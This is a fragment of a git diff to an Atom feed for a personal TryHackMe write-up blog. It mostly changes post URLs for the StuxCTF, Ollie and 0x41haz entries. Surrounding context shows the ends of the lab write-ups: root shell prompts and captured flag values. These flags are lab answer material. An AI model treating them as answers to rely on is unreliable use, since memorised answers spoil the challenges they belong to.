+<p>That all for this room hope you learnt something !</p>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Web" /><category term="Subrion" /><category term="Tryhackme" /><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">StuxCTF</title><link href="http://localhost:4000/The_Awesome_Blog/posts/stuxctf-Tryhackme/" rel="alternate" type="text/html" title="StuxCTF" /><published>2022-04-19T10:18:00+00:00</published><updated>2022-04-19T10:18:00+00:00</updated><id>http://localhost:4000/The_Awesome_Blog/posts/stuxctf-Tryhackme</id><content type="html" xml:base="http://localhost:4000/The_Awesome_Blog/posts/stuxctf-Tryhackme/"><![CDATA[<blockquote>
   <p>VOiD XD</p>
 </blockquote>
 
@@ -1411,7 +1752,7 @@ User www-data may run the following commands on ubuntu:
 root@ubuntu:~# <span class="nb">cat </span>root.txt 
 0028454003b42601548df551b738976c
 
-</code></pre></div></div>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Crypto" /><category term="Web" /><category term="Tryhackme" /><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">Ollie</title><link href="http://localhost:4000/new_blog/posts/Ollie-Tryhackme/" rel="alternate" type="text/html" title="Ollie" /><published>2022-04-08T10:18:00+00:00</published><updated>2022-04-08T10:18:00+00:00</updated><id>http://localhost:4000/new_blog/posts/Ollie-Tryhackme</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/Ollie-Tryhackme/"><![CDATA[<blockquote>
+</code></pre></div></div>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Crypto" /><category term="Web" /><category term="Tryhackme" /><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">Ollie</title><link href="http://localhost:4000/The_Awesome_Blog/posts/Ollie-Tryhackme/" rel="alternate" type="text/html" title="Ollie" /><published>2022-04-08T10:18:00+00:00</published><updated>2022-04-08T10:18:00+00:00</updated><id>http://localhost:4000/The_Awesome_Blog/posts/Ollie-Tryhackme</id><content type="html" xml:base="http://localhost:4000/The_Awesome_Blog/posts/Ollie-Tryhackme/"><![CDATA[<blockquote>
   <p>VOiD XD</p>
 </blockquote>
 
@@ -1495,7 +1836,7 @@ ollie@hackerdog:/usr/bin<span class="nv">$ </span><span class="nb">ls</span> <sp
 
 <span class="c"># cat root.txt</span>
 THM<span class="o">{</span>Ollie_Luvs_Chicken_Fries<span class="o">}</span>
-</code></pre></div></div>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Web" /><category term="Sqli" /><category term="Tryhackme" /><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">0x41haz</title><link href="http://localhost:4000/new_blog/posts/0x41haz-Tryhackme/" rel="alternate" type="text/html" title="0x41haz" /><published>2022-04-04T10:18:00+00:00</published><updated>2022-04-04T10:18:00+00:00</updated><id>http://localhost:4000/new_blog/posts/0x41haz-Tryhackme</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/0x41haz-Tryhackme/"><![CDATA[<blockquote>
+</code></pre></div></div>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Web" /><category term="Sqli" /><category term="Tryhackme" /><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">0x41haz</title><link href="http://localhost:4000/The_Awesome_Blog/posts/0x41haz-Tryhackme/" rel="alternate" type="text/html" title="0x41haz" /><published>2022-04-04T10:18:00+00:00</published><updated>2022-04-04T10:18:00+00:00</updated><id>http://localhost:4000/The_Awesome_Blog/posts/0x41haz-Tryhackme</id><content type="html" xml:base="http://localhost:4000/The_Awesome_Blog/posts/0x41haz-Tryhackme/"><![CDATA[<blockquote>
   <p>VOiD XD</p>
 </blockquote>
 
